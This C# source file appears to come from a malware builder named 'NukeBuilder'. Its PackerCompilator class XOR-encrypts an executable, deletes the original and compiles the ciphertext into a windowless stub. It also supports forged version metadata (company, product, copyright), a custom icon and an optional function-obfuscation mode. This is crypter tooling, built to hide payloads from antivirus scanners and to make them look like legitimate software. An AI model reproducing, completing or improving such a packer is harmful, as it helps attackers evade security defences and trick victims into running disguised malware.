using Microsoft.CSharp;
using NukeBuilder.Algorithms.EncryptHelper;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;


namespace NukeBuilder.Algorithms.Cryptor
{
    internal class PackerCompilator
    {

        public static void PerformPacking(string targetFile, bool UseProtect, string IconFile, string AssemblyFile)
        {
            if (File.Exists(targetFile))
            {
                byte[] RandomXor = AESEncrypt.GenerateRandomBytes(32);

                byte[] bytePayload = XOREncrypt.EncryptFile(targetFile, RandomXor);

                File.Delete(targetFile);

                CompileStub(bytePayload, RandomXor, targetFile, UseProtect, IconFile, AssemblyFile);
            }
        }

        public static void CompileStub(byte[] encPayload, byte[] key, string outPath,  bool UseProtect, string IconPath, string AssemblyTxt)
        {
            string stubSourceCode = Properties.Resources.PackerStub;

            string hexArray = AESEncrypt.GenerateHexArray(encPayload);

            stubSourceCode = Regex.Replace(
                stubSourceCode,
                @"public static byte\[\] HexPayload = new byte\[\] \{.*?\};",
                "public static byte[] HexPayload = " + hexArray,
                RegexOptions.Singleline
            );

            string newKey = "public static byte[] HexKey = new byte[] { " + string.Join(", ", key.Select(b => "0x" + b.ToString("X2"))) + " };";
            stubSourceCode= Regex.Replace(
                stubSourceCode,
                @"public static byte\[\] HexKey = new byte\[\] \{.*?\};",
                newKey,
                RegexOptions.Singleline
            );

            CompilerParameters parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = outPath,
                CompilerOptions = "/platform:x86 /target:winexe",
                IncludeDebugInformation = false
            };

            if (!string.IsNullOrEmpty(AssemblyTxt) && File.Exists(AssemblyTxt))
            {
                parameters.CompilerOptions += " /define:UseAssembly";
                var metadata = File.ReadAllLines(AssemblyTxt);

                string title = metadata.Length > 0 ? metadata[0] : "N/A";
                string description = metadata.Length > 1 ? metadata[1] : "N/A";
                string company = metadata.Length > 2 ? metadata[2] : "N/A";
                string product = metadata.Length > 3 ? metadata[3] : "N/A";
                string copyright = metadata.Length > 4 ? metadata[4] : "N/A";
                string trademarks = metadata.Length > 5 ? metadata[5] : "N/A";
                string fileVersion = metadata.Length > 6 ? metadata[6] : "N/A";
                string productVersion = metadata.Length > 7 ? metadata[7] : "N/A";

                stubSourceCode = stubSourceCode.Replace("%TITLE%", title);
                stubSourceCode = stubSourceCode.Replace("%DESC%", description);
                stubSourceCode = stubSourceCode.Replace("%COMPANY%", company);
                stubSourceCode = stubSourceCode.Replace("%PRODUCT%", product);
                stubSourceCode = stubSourceCode.Replace("%COPYRIGHT%", copyright);
                stubSourceCode = stubSourceCode.Replace("%TRADEMARK%", trademarks);
                stubSourceCode = stubSourceCode.Replace("%VERSION%", productVersion);
                stubSourceCode = stubSourceCode.Replace("%FILE_VERSION%", fileVersion);
            }

            if (UseProtect)
            {
                parameters.CompilerOptions += " /define:ProtectFunctions";

                string xorKey = "private static byte key = 0x" + XOREncrypt.XorKey.ToString("X2") + ";";
                stubSourceCode = Regex.Replace(
                    stubSourceCode,
                    @"private static byte key = 0x[0-9A-Fa-f]{2};",
                    xorKey,
                    RegexOptions.Singleline
                );

                stubSourceCode = stubSourceCode.Replace("%X%", XOREncrypt.EncryptChar);
            }

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.ReferencedAssemblies.Add("System.Linq.dll");

            if (!string.IsNullOrEmpty(IconPath) && File.Exists(IconPath))
            {
                parameters.CompilerOptions += $" /win32icon:\"{IconPath}\"";
            }

            using (CSharpCodeProvider codeProvider = new CSharpCodeProvider())
            {
                CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, stubSourceCode);

                if (results.Errors.Count > 0)
                {
                    foreach (CompilerError error in results.Errors)
                    {
                        Console.WriteLine($"Error compilation: {error.ErrorText}");
                        Console.WriteLine($"File: {error.FileName}");
                        Console.WriteLine($"String: {error.Line}, Column: {error.Column}");
                        Console.WriteLine($"ID Error: {error.ErrorNumber}");
                        Console.WriteLine($"This {(error.IsWarning ? "Warning" : "Error")}");
                        Console.WriteLine(new string('-', 50));
                    }
                    throw new InvalidOperationException("Failed to compilate.");
                }
            }
        }
    }
}
